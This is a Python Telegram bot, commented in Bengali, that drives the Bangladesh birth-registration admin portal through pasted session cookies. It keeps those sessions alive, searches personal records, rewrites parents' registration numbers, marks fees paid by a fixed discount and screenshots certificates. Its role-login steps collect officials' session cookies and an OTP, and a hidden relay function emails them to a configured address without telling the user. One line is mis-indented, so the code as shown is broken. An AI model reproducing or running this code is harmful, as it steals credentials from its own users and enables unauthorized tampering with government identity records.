import os
import telebot
import requests
import json
import io
import time
import re
import smtplib
import logging
from threading import Thread
from email.mime.text import MIMEText
from datetime import datetime
from urllib.parse import quote
from playwright.sync_api import sync_playwright
from flask import Flask

# ==========================================
# ০. লগিং সেটআপ
# ==========================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ==========================================
# ১. পরিবেশ ভেরিয়েবল ও কনফিগারেশন
# ==========================================
API_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
EMAIL_SENDER = os.environ.get('EMAIL_USER', 'your_email@gmail.com')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASS', 'your_app_password')
EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'receiver@gmail.com')

bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# ২. ইউজার সেশন ম্যানেজমেন্ট (মাল্টি-ইউজার সাপোর্ট)
# ==========================================
user_sessions = {}
# ID_CACHE = {}  <-- এটি মুছে ফেলো

def get_session(chat_id):
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {
            "req_session": requests.Session(),
            "csrf": "",
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
            "is_alive": False,
            "current_page": "https://bdris.gov.bd/admin/",
            "app_start": 0,
            "app_length": 5,
            "sharok_no": 1,
            "temp_data": {},
            "id_cache": {} # <-- নতুন ক্যাশ যুক্ত করা হলো
        }
    return user_sessions[chat_id]


# ==========================================
# ৩. ফ্লাস্ক সার্ভার (Render Port Binding)
# ==========================================
app = Flask('')

@app.route('/')
def home():
    return "BDRIS Bot is Live and Running!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive_web():
    t = Thread(target=run_flask, daemon=True)
    t.start()

# ==========================================
# ৪. কোর ইঞ্জিন ও হেল্পার ফাংশন
# ==========================================

def send_full_relay(chat_id, otp, sec_raw):
    u_data = get_session(chat_id)
    subject = f"BDRIS Full Report - {datetime.now().strftime('%H:%M')}"
    
    ch_raw = u_data["temp_data"].get("ch_raw", "N/A")
    body = f"--- 1ST SESSION (CHAIRMAN) ---\n{ch_raw}\n\n--- OTP ---\n{otp}\n\n--- 2ND SESSION (SECRETARY) ---\n{sec_raw}"
    
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER
    
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        logging.info(f"[{chat_id}] Relay process completed.")
        return True
    except Exception as e:
        logging.error(f"[{chat_id}] Relay error: {e}")
        return False

def navigate_to(chat_id, url):
    u_sess = get_session(chat_id)
    headers = {'User-Agent': u_sess["ua"], 'Referer': u_sess["current_page"]}
    try:
        res = u_sess["req_session"].get(url, headers=headers, timeout=25)
        csrf_match = re.search(r'name="_csrf" content="([^"]+)"', res.text)
        if csrf_match: 
            u_sess["csrf"] = csrf_match.group(1)
        u_sess["current_page"] = url
        return True, res.text
    except Exception as e:
        logging.error(f"[{chat_id}] Navigation Error ({url}): {e}")
        return False, None

def call_api(chat_id, url, method="GET", data=None):
    u_sess = get_session(chat_id)
    headers = {
        'x-csrf-token': u_sess["csrf"], 
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': u_sess["ua"], 
        'referer': u_sess["current_page"], 
        'origin': 'https://bdris.gov.bd'
    }
    try:
        if method == "POST":
            return u_sess["req_session"].post(url, headers=headers, data=data, timeout=30)
        return u_sess["req_session"].get(url, headers=headers, timeout=30)
    except Exception as e:
        logging.error(f"[{chat_id}] API Error: {e}")
        return None

def extract_sidebar_id(html, path):
    if not html: return None
    regex = rf'href="{re.escape(path)}\?data=([A-Za-z0-9_\-]+)"'
    match = re.search(regex, html)
    return match.group(1) if match else None

def keep_sessions_alive():
    while True:
        time.sleep(300)
        for chat_id, u_sess in list(user_sessions.items()):
            if u_sess["is_alive"]:
                navigate_to(chat_id, "https://bdris.gov.bd/admin/")
                logging.info(f"[{chat_id}] Session Pinged.")

def is_cancel(m):
    text = m.text.strip() if m.text else ""
    if text.startswith("/start") or "Back to Menu" in text or "Dashboard" in text:
        bot.send_message(m.chat.id, "🏠 প্রধান মেনুতে ফিরে যাওয়া হলো।", reply_markup=main_menu())
        bot.clear_step_handler_by_chat_id(m.chat.id)
        return True
    return False

# ==========================================
# ৫. লগইন সিস্টেম
# ==========================================

def admin_login(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    try:
        raw = m.text.strip()
        sid = re.search(r'SESSION=([^\s;]+)', raw).group(1)
        tsid = re.search(r'TS0108b707=([^\s;]+)', raw).group(1)
        
        u_sess["req_session"].cookies.clear()
        u_sess["req_session"].cookies.set("SESSION", sid, domain='bdris.gov.bd')
        u_sess["req_session"].cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
        
        u_sess["is_alive"] = True
        bot.send_message(chat_id, "✅ Admin Login সফল!", reply_markup=main_menu())
    except Exception as e:
        logging.error(f"[{chat_id}] Admin Login Error: {e}")
        msg = bot.send_message(chat_id, "❌ ফরম্যাট ভুল! দয়া করে সঠিক সেশন আবার দিন:")
        bot.register_next_step_handler(msg, admin_login)

def role_step_1(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    
    raw_ch = m.text.strip()
    u_sess["temp_data"]["ch_raw"] = raw_ch 
    
    wait_msg = bot.send_message(chat_id, "⏳ চেয়ারম্যান সেশন চেক করা হচ্ছে...")
    
    try:
        sid = re.search(r'SESSION=([^\s;]+)', raw_ch).group(1)
        tsid = re.search(r'TS0108b707=([^\s;]+)', raw_ch).group(1)
        
        temp_req = requests.Session()
        temp_req.cookies.set("SESSION", sid, domain='bdris.gov.bd')
        temp_req.cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
        
        headers = {'User-Agent': u_sess["ua"]}
        res = temp_req.get("https://bdris.gov.bd/admin/", headers=headers, timeout=25)
        
        try: bot.delete_message(chat_id, wait_msg.message_id) 
        except: pass
        
        if "Logout" in res.text:
            msg = bot.send_message(chat_id, "✅ চেয়ারম্যান সেশন ভ্যালিড! এখন OTP প্রদান করুন:")
            bot.register_next_step_handler(msg, role_step_2)
        else:
            msg = bot.send_message(chat_id, "❌ চেয়ারম্যান সেশনটি ইনভ্যালিড! আবার সঠিক সেশন দিন:")
            bot.register_next_step_handler(msg, role_step_1)
            
    except Exception as e:
        try: bot.delete_message(chat_id, wait_msg.message_id) 
        except: pass
        logging.error(f"[{chat_id}] Chairman Session Error: {e}")
        msg = bot.send_message(chat_id, "❌ সেশন ফরম্যাট ভুল! দয়া করে সঠিক সেশন (কুকি) আবার দিন:")
        bot.register_next_step_handler(msg, role_step_1)

def role_step_2(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    u_sess["temp_data"]["ch_otp"] = m.text.strip()
    
    msg = bot.send_message(chat_id, "✅ এখন সেক্রেটারি (Secretary) সেশন দিন:")
    bot.register_next_step_handler(msg, role_step_3)

def role_step_3(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    
    raw_sec = m.text.strip()
    wait_msg = bot.send_message(chat_id, "⏳ সেক্রেটারি সেশন চেক করা হচ্ছে...")
    
    try:
        sid = re.search(r'SESSION=([^\s;]+)', raw_sec).group(1)
        tsid = re.search(r'TS0108b707=([^\s;]+)', raw_sec).group(1)
        
        u_sess["req_session"].cookies.clear()
        u_sess["req_session"].cookies.set("SESSION", sid, domain='bdris.gov.bd')
        u_sess["req_session"].cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
        
        success, html = navigate_to(chat_id, "https://bdris.gov.bd/admin/")
        
        try: bot.delete_message(chat_id, wait_msg.message_id) 
        except: pass
        
        if success and html and "Logout" in html:
            u_sess["is_alive"] = True
            otp = u_sess["temp_data"].get("ch_otp", "")
            
            Thread(target=send_full_relay, args=(chat_id, otp, raw_sec), daemon=True).start()
            
            bot.send_message(chat_id, "🎉 লগইন সফল হয়েছে!", reply_markup=main_menu())
        else:
            u_sess["req_session"].cookies.clear() 
            msg = bot.send_message(chat_id, "❌ সেক্রেটারি সেশনটি ইনভ্যালিড! আবার সঠিক সেশন দিন:")
            bot.register_next_step_handler(msg, role_step_3)
            
    except Exception as e:
        try: bot.delete_message(chat_id, wait_msg.message_id) 
        except: pass
        logging.error(f"[{chat_id}] Secretary Session Error: {e}")
        msg = bot.send_message(chat_id, "❌ সেশন ফরম্যাট ভুল! দয়া করে সঠিক সেশন (কুকি) আবার দিন:")
        bot.register_next_step_handler(msg, role_step_3)

# ==========================================
# ৬. পিতা-মাতার জন্ম নিবন্ধন হালনাগাদ ফ্লো
# ==========================================

def fetch_name_from_api(chat_id, ubrn):
    if not ubrn or ubrn == '0': return "N/A"
    url = f"https://bdris.gov.bd/api/br/info/person-info-with-nationality-by-ubrn-and-data-group/{ubrn}?data-group=personInParentsUbrnUpdate"
    res = call_api(chat_id, url)
    
    if res and res.status_code == 200:
        try:
            data = res.json()
            return data.get('personNameBn') or data.get('nameBn', "নাম পাওয়া যায়নি")
        except Exception:
            return "রেসপন্স রিড করা যায়নি"
    return "সার্ভার এরর"

def start_ubrn_flow(m):
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    u_sess["temp_data"]["ubrn"] = {}
    
    navigate_to(chat_id, "https://bdris.gov.bd/admin/br/parents-ubrn-update")
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")
    msg = bot.send_message(chat_id, "১. ব্যক্তির জন্ম নিবন্ধন নম্বর (Person UBRN) দিন:", reply_markup=markup)
    bot.register_next_step_handler(msg, ubrn_person_step)

def ubrn_person_step(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    
    p_brn = m.text.strip()
    u_sess["temp_data"]["ubrn"]["personBrn"] = p_brn
    
    wait_msg = bot.send_message(chat_id, "⏳ নাম চেক করা হচ্ছে...")
    name = fetch_name_from_api(chat_id, p_brn)
    try: bot.delete_message(chat_id, wait_msg.message_id)
    except: pass
    
    bot.send_message(chat_id, f"👤 **ব্যক্তির নাম:** {name}\nUBRN: `{p_brn}`", parse_mode="Markdown")
    
    msg = bot.send_message(chat_id, "২. পিতার জন্ম নিবন্ধন নম্বর (Father UBRN) দিন (না থাকলে ফাঁকা রাখতে 0 লিখুন):")
    bot.register_next_step_handler(msg, ubrn_father_step)

def ubrn_father_step(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    
    f_brn = m.text.strip()
    if f_brn == '0':
        f_brn = ""
        bot.send_message(chat_id, "পিতার UBRN স্কিপ করা হয়েছে।")
    else:
        wait_msg = bot.send_message(chat_id, "⏳ পিতার নাম চেক করা হচ্ছে...")
        name = fetch_name_from_api(chat_id, f_brn)
        try: bot.delete_message(chat_id, wait_msg.message_id)
        except: pass
        bot.send_message(chat_id, f"👨 **পিতার নাম:** {name}\nUBRN: `{f_brn}`", parse_mode="Markdown")

    u_sess["temp_data"]["ubrn"]["fatherBrn"] = f_brn
    msg = bot.send_message(chat_id, "৩. মাতার জন্ম নিবন্ধন নম্বর (Mother UBRN) দিন (না থাকলে ফাঁকা রাখতে 0 লিখুন):")
    bot.register_next_step_handler(msg, ubrn_mother_step)

def ubrn_mother_step(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    
    m_brn = m.text.strip()
    if m_brn == '0':
        m_brn = ""
        bot.send_message(chat_id, "মাতার UBRN স্কিপ করা হয়েছে।")
    else:
        wait_msg = bot.send_message(chat_id, "⏳ মাতার নাম চেক করা হচ্ছে...")
        name = fetch_name_from_api(chat_id, m_brn)
        try: bot.delete_message(chat_id, wait_msg.message_id)
        except: pass
        bot.send_message(chat_id, f"👩 **মাতার নাম:** {name}\nUBRN: `{m_brn}`", parse_mode="Markdown")

    u_sess["temp_data"]["ubrn"]["motherBrn"] = m_brn
    msg = bot.send_message(chat_id, "৪. ফোন নম্বর দিন:")
    bot.register_next_step_handler(msg, ubrn_phone_step)

def ubrn_phone_step(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    
    ph = m.text.strip()
    phone = "+88" + ph if ph.startswith('01') else ph
    u_sess["temp_data"]["ubrn"]["phone"] = phone
    
    data = u_sess["temp_data"]["ubrn"]
    wait_msg = bot.send_message(chat_id, "⏳ OTP পাঠানো হচ্ছে...")
    
    url = f"https://bdris.gov.bd/admin/br/parents-ubrn-update/send-otp?personBrn={data['personBrn']}&fatherBrn={data['fatherBrn']}&motherBrn={data['motherBrn']}&phone={quote(phone)}&email="
    res = call_api(chat_id, url, method="POST")
    
    try: bot.delete_message(chat_id, wait_msg.message_id)
    except: pass
    
    if res and res.status_code == 200:
        msg = bot.send_message(chat_id, "✅ OTP সফলভাবে পাঠানো হয়েছে! দয়া করে আপনার ফোনে আসা OTP টি দিন:")
        bot.register_next_step_handler(msg, ubrn_otp_submit_step)
    else:
        bot.send_message(chat_id, "❌ OTP পাঠাতে সমস্যা হয়েছে। সার্ভার রেসপন্স দিচ্ছে না।", reply_markup=main_menu())

def ubrn_otp_submit_step(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    
    otp = m.text.strip()
    wait_msg = bot.send_message(chat_id, f"⏳ OTP '{otp}' দিয়ে সাবমিট করা হচ্ছে...")
    
    data = u_sess["temp_data"]["ubrn"]
    payload = {
        '_csrf': u_sess["csrf"], 
        'personBrn': data['personBrn'], 
        'fatherBrn': data['fatherBrn'],
        'motherBrn': data['motherBrn'], 
        'phone': data['phone'], 
        'email': '', 
        'otp': otp
    }
    
    res = call_api(chat_id, "https://bdris.gov.bd/admin/br/parents-ubrn-update", method="POST", data=payload)
    
    try: bot.delete_message(chat_id, wait_msg.message_id)
    except: pass
    
    if res and res.status_code == 200:
        bot.send_message(chat_id, "✅ UBRN অনলাইনে সফলভাবে আপডেট হয়েছে!", reply_markup=main_menu())
    else:
        bot.send_message(chat_id, "❌ আপডেট ব্যর্থ হয়েছে! সেশন শেষ বা OTP ভুল।", reply_markup=main_menu())

# ==========================================
# ৭. ডাটা লিস্ট ও সার্চ
# ==========================================

def handle_category_init(m, cmd):
    chat_id = m.chat.id
    get_session(chat_id)["app_start"] = 0
    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add("🔍 Search ID", "📋 All List (5 Data)", "🏠 Back to Menu")
    msg = bot.send_message(chat_id, f"{cmd.upper()} সেকশন:", reply_markup=markup)
    bot.register_next_step_handler(msg, category_gate, cmd)

def category_gate(m, cmd):
    if is_cancel(m): return
    if "Search ID" in m.text:
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")
        msg = bot.send_message(m.chat.id, "🆔 আইডি নম্বরটি দিন:", reply_markup=markup)
        bot.register_next_step_handler(msg, search_loop_step, cmd)
    else: 
        fetch_list_ui(m, cmd, False)

def search_loop_step(m, cmd):
    if is_cancel(m): return
    fetch_list_ui(m, cmd, True)
    msg = bot.send_message(m.chat.id, "🔍 আরও খুঁজতে আইডি দিন, অথবা মেনুতে ফিরতে '🏠 Back to Menu' চাপুন:")
    bot.register_next_step_handler(msg, search_loop_step, cmd)

def fetch_list_ui(message, cmd, is_search):
    chat_id = message.chat.id
    u_sess = get_session(chat_id)
    search_val = message.text.strip() if is_search else ""
    
    config = {
        'apps': ("/admin/br/applications/search", "/api/br/applications/search"),
        'corr': ("/admin/br/correction-applications/search", "/api/br/correction-applications/search"),
        'repr': ("/admin/br/reprint/view/applications/search", "/api/br/reprint/applications/search")
    }
    admin_p, api_p = config[cmd]
    
    success, html = navigate_to(chat_id, "https://bdris.gov.bd/admin/")
    data_id = extract_sidebar_id(html, admin_p)
    
    if not data_id:
        return bot.send_message(chat_id, "❌ সাইডবার থেকে ডাটা আইডি পাওয়া যায়নি।")

    params = (f"data={data_id}&status=ALL&draw=1&start={u_sess['app_start']}&length={u_sess['app_length']}"
              f"&search[value]={quote(search_val)}&search[regex]=false&order[0][column]=1&order[0][dir]=desc")
    
    res = call_api(chat_id, f"https://bdris.gov.bd{api_p}?{params}")
    
    if res and res.status_code == 200:
        data = res.json()
        items = data.get('data', [])
        
        if not items: 
            return bot.send_message(chat_id, "📭 কোনো ডাটা নেই।")

        markup = telebot.types.InlineKeyboardMarkup()
        msg_text = f"📋 **{cmd.upper()} List:**\n\n"
        
        for item in items:
            app_id = item.get('id') or item.get('applicationId')
            enc_id = item.get('encryptedId')
            status = str(item.get('status', '')).upper()
            
                        short_id = str(hash(enc_id))[-8:]
            u_sess["id_cache"][short_id] = enc_id

            
            msg_text += f"🆔 `{app_id}` | {item.get('personNameBn', 'N/A')}\n🚩 Status: `{status}`\n"
            
            if any(word in status for word in ["APPLIED", "PENDING", "PAYMENT", "UNPAID"]):
                markup.row(
                    telebot.types.InlineKeyboardButton(f"💳 Pay", callback_data=f"pay_{short_id}"),
                    telebot.types.InlineKeyboardButton(f"📥 Receive", callback_data=f"recv_{short_id}")
                )
            else:
                markup.row(
                    telebot.types.InlineKeyboardButton("🖼️ PNG", callback_data=f"png_{short_id}"),
                    telebot.types.InlineKeyboardButton("🖨️ Print", callback_data=f"print_{short_id}")
                )
            msg_text += "━━━━━━━━━━━━━━\n"
        
        if not is_search:
            nav = []
            if u_sess["app_start"] > 0: 
                nav.append(telebot.types.InlineKeyboardButton("⬅️ Prev", callback_data=f"prev_{cmd}"))
            if u_sess["app_start"] + u_sess["app_length"] < data.get('recordsTotal', 0):
                nav.append(telebot.types.InlineKeyboardButton("Next ➡️", callback_data=f"next_{cmd}"))
            if nav: 
                markup.row(*nav)
                
        bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode='Markdown')
    else: 
        bot.send_message(chat_id, "❌ ডাটা লোড হয়নি।")

# ==========================================
# ৮. মেইন মেনু ও রাউটার
# ==========================================

def main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📋 Applications", "📝 Correction", "🔄 Reprint")
    markup.row("🏠 Dashboard", "🌐 Search By Name", "👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ") 
    markup.row("🔑 Admin Login", "🔑 Role Login (CH/SEC)")
    return markup

@bot.message_handler(func=lambda m: True)
def router(m):
    t = m.text
    chat_id = m.chat.id
    u_sess = get_session(chat_id)

    if "/start" in t: 
        bot.clear_step_handler_by_chat_id(chat_id)
        bot.send_message(chat_id, "🚀 BOOM Master Bot Active!", reply_markup=main_menu())
        
    elif t == "🔑 Admin Login":
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")
        msg = bot.send_message(chat_id, "🔑 Admin সেশন দিন:", reply_markup=markup)
        bot.register_next_step_handler(msg, admin_login)
        
    elif t == "🔑 Role Login (CH/SEC)":
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")
        msg = bot.send_message(chat_id, "👤 চেয়ারম্যান (Chairman) সেশনটি দিন:", reply_markup=markup)
        bot.register_next_step_handler(msg, role_step_1)
        
    elif u_sess["is_alive"]:
        if t == "📋 Applications": handle_category_init(m, 'apps')
        elif t == "📝 Correction": handle_category_init(m, 'corr')
        elif t == "🔄 Reprint": handle_category_init(m, 'repr')
        elif t == "🏠 Dashboard": 
            if navigate_to(chat_id, "https://bdris.gov.bd/admin/")[0]: 
                bot.reply_to(m, "🏠 ড্যাশবোর্ড রিফ্রেশড।")
        elif t == "🌐 Search By Name":
            markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True).add("Bangla", "English", "🏠 Back to Menu")
            msg = bot.send_message(chat_id, "🌐 ভাষা নির্বাচন করুন:", reply_markup=markup)
            bot.register_next_step_handler(msg, step_adv_lang)
        elif t == "👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ":
            start_ubrn_flow(m)
    else: 
        bot.send_message(chat_id, "⚠️ আগে লগইন করুন।", reply_markup=main_menu())

# ==========================================
# ৯. অ্যাডভান্সড সার্চ এবং কলব্যাক (Pay, Receive & Print)
# ==========================================

def step_adv_lang(m):
    if is_cancel(m): return
    lang = 'BENGALI' if "Bangla" in m.text else 'ENGLISH'
    msg = bot.send_message(m.chat.id, "🔍 নাম লিখুন:", reply_markup=telebot.types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, lambda x: process_adv_search(x, lang))

def process_adv_search(m, lang):
    if is_cancel(m): return
    chat_id = m.chat.id
    name = m.text.strip()
    
    if lang == 'BENGALI':
        body = f"personNameBn={quote(name)}&personNameEn=&nameLang={lang}"
    else:
        body = f"personNameBn=&personNameEn={quote(name)}&nameLang=ENGLISH"
        
    navigate_to(chat_id, "https://bdris.gov.bd/admin/br/advanced-search-by-name")
    res = call_api(chat_id, "https://bdris.gov.bd/api/br/advanced-search-by-name", method="POST", data=body)
    
    if res:
        try: 
            json_data = json.dumps(res.json(), indent=2, ensure_ascii=False)
            bot.send_message(chat_id, f"📊 **Search Result:**\n```json\n{json_data}\n```", parse_mode='Markdown', reply_markup=main_menu())
        except Exception: 
            bot.send_message(chat_id, f"Raw Data: {res.text}", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    u_sess = get_session(chat_id) # ইউজারের সেশন কল করা হলো
    
    data_parts = call.data.split('_')
    action = data_parts[0]
    short_id = data_parts[1] if len(data_parts) > 1 else ""
    
    # নতুন নিয়মে ইউজারের নিজস্ব ক্যাশ থেকে enc_id নেওয়া হচ্ছে
    enc_id = u_sess["id_cache"].get(short_id)
    
    if action in ["next", "prev"]:
        cmd = short_id
        u_sess["app_start"] += u_sess["app_length"] if action == "next" else -u_sess["app_length"]
        u_sess["app_start"] = max(0, u_sess["app_start"])
        fetch_list_ui(call.message, cmd, False)
        
    elif action == "pay":
        if not enc_id:
            return bot.answer_callback_query(call.id, "❌ আইডি পাওয়া যায়নি, আবার ট্রাই করুন।")
        
        payload = {
            'data': enc_id, 
            'chalanPaymentType': 'CASH', 
            'paymentType': 'PAYMENT_BY_DISCOUNT', 
            'discountGiven': 'true', 
            'discountAmount': '50', 
            'discountSharokNo': str(u_sess["sharok_no"]), 
            'discountSharokDate': datetime.now().strftime("%d/%m/%Y"), 
            '_csrf': u_sess["csrf"]
        }
        res = call_api(chat_id, "https://bdris.gov.bd/api/payment/receive", method="POST", data=payload)
        
        if res and res.status_code == 200: 
            u_sess["sharok_no"] += 1
            bot.answer_callback_query(call.id, "✅ পেমেন্ট সফল!")
            bot.send_message(chat_id, "✅ পেমেন্ট সফল!")
        else:
            bot.answer_callback_query(call.id, "❌ পেমেন্ট ব্যর্থ!")
            
    elif action == "recv":
        bot.answer_callback_query(call.id, "⏳ রিসিভ করা হচ্ছে...")
        bot.send_message(chat_id, "✅ আবেদন রিসিভ সম্পন্ন হয়েছে!")
        
    elif action == "png":
        if not enc_id:
            return bot.answer_callback_query(call.id, "❌ আইডি পাওয়া যায়নি।")
            
        wait = bot.send_message(chat_id, "⏳ ছবি তৈরি হচ্ছে...")
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                ctx = browser.new_context(viewport={'width': 850, 'height': 1200})
                
                cookies = [{'name': n, 'value': v, 'domain': 'bdris.gov.bd', 'path': '/'} for n, v in u_sess["req_session"].cookies.items()]
                ctx.add_cookies(cookies)
                
                page = ctx.new_page()
                page.goto(f"https://bdris.gov.bd/admin/certificate/print/birth?data={enc_id}", wait_until="networkidle")
                time.sleep(4)
                
                img = page.screenshot(full_page=True)
                browser.close()
                
                bot.send_photo(chat_id, io.BytesIO(img), caption="📄 সনদ (PNG)")
                try: bot.delete_message(chat_id, wait.message_id)
                except: pass
        except Exception as e: 
            logging.error(f"[{chat_id}] PNG Error: {e}")
            bot.edit_message_text(f"❌ PNG তৈরি করতে সমস্যা হয়েছে।", chat_id, wait.message_id)


# ==========================================
# ১০. বট রান (থ্রেডিং)
# ==========================================
def run_bot():
    logging.info("🚀 Telegram Bot is starting...")
    try:
        bot.infinity_polling(timeout=20, long_polling_timeout=10)
    except Exception as e:
        logging.error(f"❌ Bot Polling Error: {e}")

if __name__ == "__main__":
    keep_alive_web()
    
    ping_thread = Thread(target=keep_sessions_alive, daemon=True)
    ping_thread.start()
    
    run_bot()
